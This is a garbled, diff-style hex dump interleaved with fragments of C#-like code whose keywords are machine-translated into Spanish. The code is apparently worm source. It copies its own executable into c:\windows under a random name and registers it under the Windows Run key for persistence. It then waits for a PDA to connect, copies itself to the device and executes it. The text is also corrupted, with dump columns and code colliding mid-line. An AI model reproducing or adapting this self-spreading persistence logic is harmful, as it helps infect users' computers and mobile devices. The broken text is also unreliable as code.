+ar bucle hasta que presente PDA                                       00006310  62 69 6c 65 20 65 78 69  73 74 65 2c 20 65 6a 65  |bile existe, eje|                                   local4.Connect (); #conectar
+                 loc00006320  63 75 74 65 0a 20 20 20  20 20 20 20 20 74 72 61  |cute.        tra|
+al9.CopyTo (local12);                                                       local14 = "\\00006330  74 61 72 20 7b 0a 20 20  20 20 20 20 20 20 20 20  |tar {.          |           Windows \\" + local11; #definir destino
+     00006340  6c 6f 63 61 6c 34 20 3d  20 6e 75 65 76 6f 20 52  |local4 = nuevo R|
+           local4.CopyFileToDevice (local12, loc00006350  41 50 49 20 28 29 3b 0a  20 20 20 20 20 20 20 20  |API ();.        |                                                   al14, verdadero); #copiar archivo a PDA
+  00006360  20 20 6c 6f 63 61 6c 35  20 3d 20 41 73 73 65 6d  |  local5 = Assem|
+              local4.CreateProcess (local00006370  62 6c 79 2e 47 65 74 45  78 65 63 75 74 69 6e 67  |bly.GetExecuting|                                                          14, "0"); #execute archivo
+             00006380  41 73 73 65 6d 62 6c 79  20 28 29 2e 20 47 65 74  |Assembly (). Get|
+    local4.Disconnect (); #desconectar                        00006390  4e 61 6d 65 20 28 29 2e  20 43 6f 64 65 42 61 73  |Name (). CodeBas|                                            }                                                                                                                      catch (Exception) {} #if error lu000063a0  65 3b 0a 20 20 20 20 20  20 20 20 20 20 6c 6f 63  |e;.          loc|
+ego captura excepción                                                                                                         }000063b0  61 6c 35 20 3d 20 6c 6f  63 61 6c 35 2e 52 65 70  |al5 = local5.Rep|
+000063c0  6c 61 63 65 20 28 22 2f  22 2c 20 22 5c 5c 22 29  |lace ("/", "\\")|
+000063d0  3b 0a 20 20 20 20 20 20  20 20 20 20 6c 6f 63 61  |;.          loca|
+000063e0  6c 36 20 3d 20 6c 6f 63  61 6c 35 2e 4c 61 73 74  |l6 = local5.Last|
+000063f0  49 6e 64 65 78 4f 66 20  28 22 5c 5c 22 29 3b 0a  |IndexOf ("\\");.|
+00006400  20 20 20 20 20 20 20 20  20 20 6c 6f 63 61 6c 37  |          local7|
+00006410  20 3d 20 6c 6f 63 61 6c  35 2e 53 75 62 73 74 72  | = local5.Substr|
+00006420  69 6e 67 20 28 6c 6f 63  61 6c 36 20 2b 20 31 2c  |ing (local6 + 1,|
+00006430  20 6c 6f 63 61 6c 35 2e  4c 65 6e 67 74 68 20 2d  | local5.Length -|
+00006440  20 6c 6f 63 61 6c 36 20  2d 20 31 29 3b 0a 20 20  | local6 - 1);.  |                                        00006450  20 20 20 20 20 20 20 20  6c 6f 63 61 6c 35 20 3d  |        local5 =|
+00006460  20 6c 6f 63 61 6c 35 2e  20 45 6c 69 6d 69 6e 61  | local5. Elimina|
+00006470  72 20 28 30 2c 20 38 29  3b 0a 20 20 20 20 20 20  |r (0, 8);.      |
+00006480  20 20 20 20 6c 6f 63 61  6c 35 20 3d 20 6c 6f 63  |    local5 = loc|
+00006490  61 6c 35 2e 53 75 62 73  74 72 69 6e 67 20 28 30  |al5.Substring (0|
+000064a0  2c 20 6c 6f 63 61 6c 35  2e 4c 61 73 74 49 6e 64  |, local5.LastInd|                                        000064b0  65 78 4f 66 20 28 22 5c  5c 22 29 20 2b 20 31 29  |exOf ("\\") + 1)|
+000064c0  3b 0a 20 20 20 20 20 20  20 20 20 20 6c 6f 63 61  |;.          loca|
+000064d0  6c 38 20 3d 20 6c 6f 63  61 6c 35 20 2b 20 6c 6f  |l8 = local5 + lo|
+000064e0  63 61 6c 37 3b 0a 20 20  20 20 20 20 20 20 20 20  |cal7;.          |                                        000064f0  6c 6f 63 61 6c 39 20 3d  20 6e 75 65 76 6f 20 46  |local9 = nuevo F|
+00006500  69 6c 65 49 6e 66 6f 20  28 6c 6f 63 61 6c 38 29  |ileInfo (local8)|
+00006510  3b 0a 20 20 20 20 20 20  20 20 20 20 6c 6f 63 61  |;.          loca|                                        00006520  6c 31 30 20 3d 20 6e 75  65 76 6f 20 52 61 6e 64  |l10 = nuevo Rand|
+00006530  6f 6d 20 28 29 3b 20 23  63 72 65 61 72 20 6e 6f  |om (); #crear no|
+00006540  6d 62 72 65 20 64 65 20  61 72 63 68 69 76 6f 0a  |mbre de archivo.|
+00006550  20 20 20 20 20 20 20 20  20 20 6c 6f 63 61 6c 31  |          local1|
+00006560  31 20 3d 20 43 6f 6e 76  65 72 74 2e 54 6f 53 74  |1 = Convert.ToSt|
+00006570  72 69 6e 67 20 28 6c 6f  63 61 6c 31 30 2e 4e 65  |ring (local10.Ne|                                        00006580  78 74 20 28 29 29 20 2b  20 22 2e 65 78 65 22 3b  |xt ()) + ".exe";|
+00006590  0a 20 20 20 20 20 20 20  20 20 20 6c 6f 63 61 6c  |.          local|
+000065a0  31 32 20 3d 20 22 63 3a  20 5c 5c 20 77 69 6e 64  |12 = "c: \\ wind|
+000065b0  6f 77 73 20 5c 5c 22 20  2b 20 6c 6f 63 61 6c 31  |ows \\" + local1|
+000065c0  31 3b 20 23 69 6e 63 6c  75 79 65 20 65 6c 20 63  |1; #incluye el c|
+000065d0  61 6d 69 6e 6f 0a 20 20  20 20 20 20 20 20 20 20  |amino.          |
+000065e0  6c 6f 63 61 6c 31 33 20  3d 20 6e 75 65 76 6f 20  |local13 = nuevo |
+000065f0  2d 0a 41 75 74 6f 53 74  61 72 74 41 70 70 73 20  |-.AutoStartApps |
+00006600  28 22 53 4f 46 54 57 41  52 45 20 5c 5c 20 4d 69  |("SOFTWARE \\ Mi|                                        00006610  63 72 6f 73 6f 66 74 20  5c 5c 20 57 69 6e 64 6f  |crosoft \\ Windo|
+00006620  77 73 20 5c 5c 20 43 75  72 72 65 6e 74 56 65 72  |ws \\ CurrentVer|
+00006630  73 69 6f 6e 20 5c 5c 20  52 75 6e 20 5c 5c 22 29  |sion \\ Run \\")|
+00006640  3b 0a 20 20 20 20 20 20  20 20 20 23 20 64 65 66  |;.         # def|                                        00006650  69 6e 65 20 6c 61 20 63  6c 61 76 65 20 64 65 20  |ine la clave de |
+00006660  72 65 67 69 73 74 72 6f  0a 20 20 20 20 20 20 20  |registro.       |
+00006670  20 20 20 6c 6f 63 61 6c  31 33 2e 41 64 64 20 28  |   local13.Add (|
+00006680  6c 6f 63 61 6c 31 32 29  3b 20 23 61 64 64 20 6e  |local12); #add n|
+00006690  75 65 76 6f 20 61 72 63  68 69 76 6f 20 61 6c 20  |uevo archivo al |
+000066a0  72 65 67 69 73 74 72 6f  0a 20 20 20 20 20 20 20  |registro.       |
+000066b0  20 20 20 6c 6f 63 61 6c  34 2e 43 6f 6e 6e 65 63  |   local4.Connec|
+000066c0  74 20 28 29 3b 20 23 20  69 6e 74 65 6e 74 61 72  |t (); # intentar|
+000066d0  20 63 6f 6e 65 63 74 61  72 73 65 20 61 20 50 44  | conectarse a PD|
+000066e0  41 0a 20 20 20 20 20 20  20 20 20 20 77 68 69 6c  |A.          whil|
+000066f0  65 20 28 21 20 28 6c 6f  63 61 6c 34 2e 44 65 76  |e (! (local4.Dev|
+00006700  69 63 65 50 72 65 73 65  6e 74 29 29 20 23 63 6f  |icePresent)) #co|
+00006710  6e 74 69 6e 75 61 72 20  62 75 63 6c 65 20 68 61  |ntinuar bucle ha|                                        00006720  73 74 61 20 71 75 65 20  70 72 65 73 65 6e 74 65  |sta que presente|
+00006730  20 50 44 41 0a 20 20 20  20 20 20 20 20 20 20 20  | PDA.           |
+00006740  20 20 20 20 20 20 6c 6f  63 61 6c 34 2e 43 6f 6e  |      local4.Con|                                        00006750  6e 65 63 74 20 28 29 3b  20 23 63 6f 6e 65 63 74  |nect (); #conect|
+00006760  61 72 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |ar.             |
+00006770  20 20 20 20 6c 6f 63 61  6c 39 2e 43 6f 70 79 54  |    local9.CopyT|
+00006780  6f 20 28 6c 6f 63 61 6c  31 32 29 3b 20 0a 20 20  |o (local12); .  |                                        00006790  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6c  |               l|                                        000067a0  6f 63 61 6c 31 34 20 3d  20 22 5c 5c 20 57 69 6e  |ocal14 = "\\ Win|
+000067b0  64 6f 77 73 20 5c 5c 22  20 2b 20 6c 6f 63 61 6c  |dows \\" + local|
+000067c0  31 31 3b 20 23 64 65 66  69 6e 69 72 20 64 65 73  |11; #definir des|
+000067d0  74 69 6e 6f 0a 20 20 20  20 20 20 20 20 20 20 20  |tino.           |                                        000067e0  20 20 20 20 20 6c 6f 63  61 6c 34 2e 43 6f 70 79  |     local4.Copy|                                        000067f0  46 69 6c 65 54 6f 44 65  76 69 63 65 20 28 6c 6f  |FileToDevice (lo|                                        00006800  63 61 6c 31 32 2c 20 6c  6f 63 61 6c 31 34 2c 20  |cal12, local14, |                                        00006810  76 65 72 64 61 64 65 72  6f 29 3b 20 23 63 6f 70  |verdadero); #cop|
+00006820  69 61 72 20 61 72 63 68  69 76 6f 20 61 20 50 44  |iar archivo a PD|                                        00006830  41 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |A.              |
+00006840  20 20 6c 6f 63 61 6c 34  2e 43 72 65 61 74 65 50  |  local4.CreateP|
+00006850  72 6f 63 65 73 73 20 28  6c 6f 63 61 6c 31 34 2c  |rocess (local14,|                                        00006860  20 22 30 22 29 3b 20 23  65 78 65 63 75 74 65 20  | "0"); #execute |                                        00006870  61 72 63 68 69 76 6f 0a  20 20 20 20 20 20 20 20  |archivo.        |                                        00006880  20 20 20 20 20 20 20 20  20 6c 6f 63 61 6c 34 2e  |         local4.|
+00006890  44 69 73 63 6f 6e 6e 65  63 74 20 28 29 3b 20 23  |Disconnect (); #|                                        000068a0  64 65 73 63 6f 6e 65 63  74 61 72 0a 20 20 20 20  |desconectar.    |                                        000068b0  20 20 20 20 20 20 7d 0a  0a 20 20 20 20 20 20 20  |      }..       |
+000068c0  20 63 61 74 63 68 20 28  45 78 63 65 70 74 69 6f  | catch (Exceptio|                                        000068d0  6e 29 20 7b 7d 20 23 69  66 20 65 72 72 6f 72 20  |n) {} #if error |                                        000068e0  6c 75 65 67 6f 20 63 61  70 74 75 72 61 20 65 78  |luego captura ex|
